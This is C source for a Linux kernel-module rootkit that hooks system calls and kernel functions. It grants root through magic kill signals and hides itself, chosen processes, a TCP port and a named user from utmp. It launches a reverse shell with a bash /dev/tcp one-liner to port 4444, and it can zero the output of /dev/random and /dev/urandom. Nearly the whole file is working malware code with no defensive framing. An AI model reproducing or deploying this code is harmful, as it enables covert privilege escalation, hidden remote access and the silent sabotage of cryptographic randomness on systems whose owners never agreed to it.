#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/dirent.h>
#include <linux/tcp.h>
#include <linux/kmod.h>

#include "set_root.h"
#include "hide_rootkit.h"
#include "utmp.h"

#define PREFIX "sa_rootkit"
#define HIDDEN_USER "james"

static short hidden = 0;
static short random_toggle = 0;

static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_openat)(const struct pt_regs *);
static asmlinkage long (*orig_pread64)(const struct pt_regs *);
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_random_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);
static asmlinkage long (*orig_urandom_read)(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos);

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/127.0.0.1/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

struct linux_dirent {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

typedef struct hidden_pid {
    char hide_pid[NAME_MAX];
    struct hidden_pid* next;
} hidden_pid;

struct hidden_pid* pids_head = NULL;
int tamper_fd;
int hide_port = 8080;

asmlinkage int hook_kill(const struct pt_regs *regs) {
	void set_root(void);
	void showme(void);
	void hideme(void);

    int pid = regs->di;
	int sig = regs->si;

	if (sig == 64) {
		printk(KERN_INFO "rootkit: giving root...\n");
		set_root();
		return 0;
	}
	if (sig == 63 && hidden == 0) {
		printk(KERN_INFO "rootkit: hiding rootkit\n");
		hideme();
		hidden = 1;
	} else if (sig == 63 && hidden == 1) {
		printk(KERN_INFO "rootkit: revealing rootkit\n");
		showme();
		hidden = 0;
	}
    if (sig == 62) {
        char hide_pid[NAME_MAX];
        int hidden = 0;
		sprintf(hide_pid, "%d", pid);
        struct hidden_pid* curr_ptr = pids_head;
        struct hidden_pid* prev = pids_head;
        while (curr_ptr != NULL) {
            if (strncmp(hide_pid, curr_ptr->hide_pid, strlen(hide_pid) > strlen(curr_ptr->hide_pid)
                ? strlen(hide_pid)
                : strlen(curr_ptr->hide_pid)) == 0) {
                    hidden = 1;
                    break;
                }
            prev = curr_ptr;
            curr_ptr = curr_ptr->next;
        }
        if (hidden) {
		    printk(KERN_INFO "rootkit: revealing process with pid %d\n", pid);
            if (prev == curr_ptr) pids_head = curr_ptr->next;
            else prev->next = curr_ptr->next;
            kfree(curr_ptr);
            return 0;
        }
        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
        struct hidden_pid* new_pid = kzalloc(sizeof(struct hidden_pid), GFP_KERNEL);
		sprintf(new_pid->hide_pid, "%d", pid);
        new_pid->next = NULL;
        if (prev == curr_ptr) pids_head = new_pid;
        else prev->next = new_pid;
		return 0;
	}
    if (sig == 61) {
		printk(KERN_INFO "rootkit: hiding port %d\n", pid);
		hide_port = pid;
		return 0;
	}
    if (sig == 60) {
        return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    }
    if (sig == 59) {
        random_toggle = !random_toggle;
        return 0;
    }

	return orig_kill(regs);
}

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

	struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
	unsigned long offset = 0;

	int ret = orig_getdents64(regs);
	dirent_ker = kzalloc(ret, GFP_KERNEL);

	if (ret <= 0 || dirent_ker == NULL) return ret;

	long error;
	error = copy_from_user(dirent_ker, dirent, ret);
	if (error) {
        kfree(dirent_ker);
        return error;
    }

	while (offset < ret) {
		current_dir = (void *)dirent_ker + offset;
		
        struct hidden_pid* curr_ptr = pids_head;
        int hidden = 0;
        while (curr_ptr != NULL) {
            if (strncmp(current_dir->d_name, curr_ptr->hide_pid, strlen(current_dir->d_name) > strlen(curr_ptr->hide_pid)
                ? strlen(current_dir->d_name)
                : strlen(curr_ptr->hide_pid)) == 0) {
                    hidden = 1;
                    break;
                }
            curr_ptr = curr_ptr->next;
        }

		if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0
        || hidden) {
			printk(KERN_DEBUG "rootkit: Found %s\n", current_dir ->d_name);
			if (current_dir == dirent_ker) {
				ret -= current_dir->d_reclen;
				memmove(current_dir, (void*)current_dir + current_dir->d_reclen, ret);
				continue;
			}
			previous_dir->d_reclen += current_dir->d_reclen;
		} else {
			previous_dir = current_dir;
		}

		offset += current_dir->d_reclen;
	}

	error = copy_to_user(dirent, dirent_ker, ret);

	kfree(dirent_ker);
	return ret;
}

asmlinkage int hook_openat(const struct pt_regs *regs)
{
	char *filename = (char *)regs->si;

	char *kbuf;
	char *target = "/var/run/utmp";
	int target_len = 14;
	long error;

	kbuf = kzalloc(NAME_MAX, GFP_KERNEL);
	if (kbuf == NULL) return orig_openat(regs);

	error = copy_from_user(kbuf, filename, NAME_MAX);
	if (error) return orig_openat(regs);

	if (memcmp(kbuf, target, target_len) == 0) {
		tamper_fd = orig_openat(regs);
		kfree(kbuf);
		return tamper_fd;
	}

	kfree(kbuf);
	return orig_openat(regs);
}

asmlinkage int hook_pread64(const struct pt_regs *regs)
{
	int fd = regs->di;
	char *buf = (char *)regs->si;
	size_t count = regs->dx;
	
	char *kbuf;
	struct utmp *utmp_buf;
	long error;
	int i, ret;

	if (fd == tamper_fd && fd != 0 && fd != 1 && fd != 2) {
		kbuf = kzalloc(count, GFP_KERNEL);
		if (kbuf == NULL) return orig_pread64(regs);

		ret = orig_pread64(regs);

		error = copy_from_user(kbuf, buf, count);
		if (error != 0) return ret;

		utmp_buf = (struct utmp *)kbuf;

		if (memcmp(utmp_buf->ut_user, HIDDEN_USER, strlen(HIDDEN_USER)) == 0) {
			for (i = 0; i < count; i++) kbuf[i] = 0x0;
			error = copy_to_user(buf, kbuf, count);
			kfree(kbuf);
			return ret;
		}
		kfree(kbuf);
		return ret;
	}
	return orig_pread64(regs);
}

asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
	struct sock *sk = v;
	if (sk != 0x1 && sk->sk_num == hide_port) return 0;
	return orig_tcp4_seq_show(seq, v);
}

asmlinkage int hook_random_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
	int bytes_read, i;	
	long error;
	char *kbuf = NULL;

	bytes_read = orig_random_read(file, buf, nbytes, ppos);	
    if (!random_toggle) return bytes_read;

	kbuf = kzalloc(bytes_read, GFP_KERNEL);

	error = copy_from_user(kbuf, buf, bytes_read);

	if (error) {
		printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
		kfree(kbuf);
		return bytes_read;
	}

	for (i = 0; i < bytes_read; i++)
		kbuf[i] = 0x00;

	error = copy_to_user(buf, kbuf, bytes_read);
	if (error)
		printk(KERN_DEBUG "rootkit: %ld bytes could not be copied back into buf\n", error);

	kfree(kbuf);
	return bytes_read;
}


asmlinkage int hook_urandom_read(struct file *file, char __user *buf, size_t nbytes, loff_t *ppos)
{
	int bytes_read, i;	
	long error;
	char *kbuf = NULL;

	bytes_read = orig_urandom_read(file, buf, nbytes, ppos);	
    if (!random_toggle) return bytes_read;

	kbuf = kzalloc(bytes_read, GFP_KERNEL);

	error = copy_from_user(kbuf, buf, bytes_read);

	if (error) {
		printk(KERN_DEBUG "rootkit: %ld bytes could not be copied into kbuf\n", error);
		kfree(kbuf);
		return bytes_read;
	}

	for (i = 0; i < bytes_read; i++)
		kbuf[i] = 0x00;

	error = copy_to_user(buf, kbuf, bytes_read);
	if (error)
		printk(KERN_DEBUG "rootkit: %ld bytes could not be copied back into buf\n", error);

	kfree(kbuf);
	return bytes_read;
}